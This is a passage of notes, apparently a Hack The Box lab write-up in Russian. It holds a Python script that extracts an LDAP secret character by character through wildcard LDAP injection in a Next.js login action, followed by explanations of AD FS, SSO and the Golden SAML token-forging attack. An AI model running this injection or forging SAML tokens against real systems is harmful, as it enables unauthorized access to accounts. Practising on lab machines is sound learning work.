```
import requests
import string
import re
import json
def get_secret(debug=False):
    url = "http://intranet.ghost.htb:8008/login"
    secret = ""
    alphabet = string.ascii_letters + string.digits
    page = requests.get(url).text
    action_1_0 = re.search(r'<input type="hidden" name="\$ACTION_1:0" value="([^"]+)"',page).group(1).replace("&quot;",'"' )
    action_key = re.search(r'<input type="hidden" name="\$ACTION_KEY" value="([^"]+)"',page).group(1).replace("&quot;",'"')
    next_action = json.loads(action_1_0)["id"]
    for i in range(16):
        for letter in alphabet:
            r = requests.post(url, data={"1_$ACTION_REF_1":"","1_$ACTION_1:0":action_1_0, "1_$ACTION_1:1":"[{}]", "1_$ACTION_KEY":action_key,"1_ldap-username":"gitea_temp_principal", "1_ldap-secret": secret + letter + "*","0":'[{},"$K1"]'}, headers={"Next-Action":next_action})
            if "Invalid combination" in r.text:
                continue
            secret += letter
            if debug:
                print(letter, end='', flush=True)
                break
            if debug:
                print
    return secret

if __name__ == "__main__":
    get_secret(debug=True)

> [!NOTE] ADFS
> **AD FS (Active Directory Federation Services)** — сервис Microsoft для **федеративной аутентификации**.
> 
> Его задача — позволить пользователю один раз пройти аутентификацию в одной системе и затем получать доступ к другим приложениям без повторного ввода пароля.
>
 > ```
 > Пользователь
 >      │
 >      ▼
 >    AD FS
 >      │
 >      │ проверяет пользователя через AD
 >      ▼
 > Active Directory
 >      │
 >      │ успешная аутентификация
 >      ▼
 > AD FS создаёт SAML-токен
 >      │
 >      ▼
 > Приложение / Service Provider
 > ```
 > 
 > **SSO (Single Sign-On)** — механизм, позволяющий пользователю аутентифицироваться один раз у Identity Provider (например, AD FS) и затем получать доступ к нескольким доверенным приложениям без повторного ввода учётных данных. В AD FS результат аутентификации обычно передаётся приложению в виде подписанного security token, например SAML assertion.

Нам необходимо вернуться назад к веб-ресурсам, и понять где мы можем авторизоваться с помощью `SSO`. У нас есть субдомен - `https://core.ghost.htb:8443/`, при переходе на него мы видим следующее сообщение:

> [!NOTE] Title
>  
>  **Golden SAML** — атака на федеративную аутентификацию, при которой атакующий получает приватный ключ сертификата, которым Identity Provider (IdP) подписывает SAML-токены, и использует его для создания собственных валидных токенов.
 > 
 > В случае Microsoft основная цель — AD FS.
 > 
 > Главная идея:
 > 
 > > Если у атакующего есть ключ, которым AD FS подписывает SAML-токены, он может создавать токены, которые приложения воспринимают как выпущенные самим AD FS.
 > 
 > Это концептуально похоже на Golden Ticket в Kerberos, только атакуется не Kerberos, а федеративная SAML-аутентификация.
